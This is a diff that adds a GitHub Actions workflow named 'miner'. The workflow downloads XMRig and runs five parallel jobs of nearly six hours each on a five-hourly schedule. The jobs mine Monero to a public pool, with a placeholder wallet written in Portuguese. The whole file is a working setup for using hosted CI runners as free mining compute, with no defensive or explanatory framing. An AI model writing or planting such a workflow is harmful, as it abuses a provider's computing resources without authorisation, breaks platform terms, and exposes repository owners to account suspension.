@@ -1,0 +1,49 @@
+name: miner
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 */5 * * *'
+  push:
+    paths:
+      - '.github/workflows/miner.yml'
+
+concurrency:
+  group: miner
+  cancel-in-progress: false
+
+jobs:
+  mine:
+    runs-on: ubuntu-latest
+    timeout-minutes: 340
+    strategy:
+      fail-fast: false
+      max-parallel: 5
+      matrix:
+        worker: [1, 2, 3, 4, 5]
+    steps:
+      - name: Cache XMRig
+        id: cache
+        uses: actions/cache@v4
+        with:
+          path: xmrig
+          key: xmrig-6.22.2-linux-static
+
+      - name: Baixar XMRig
+        if: steps.cache.outputs.cache-hit != 'true'
+        run: |
+          wget -q https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xf xmrig-6.22.2-linux-static-x64.tar.gz
+          mv xmrig-6.22.2 xmrig
+          chmod +x xmrig/xmrig
+
+      - name: Minerar
+        run: |
+          ./xmrig/xmrig \
+            -o gulf.moneroocean.stream:443 \
+            --tls \
+            -u COLE_SEU_SUBENDERECO_AQUI \
+            -p w1-${{ matrix.worker }} \
+            -k \
+            --coin monero \
+            --donate-level 1
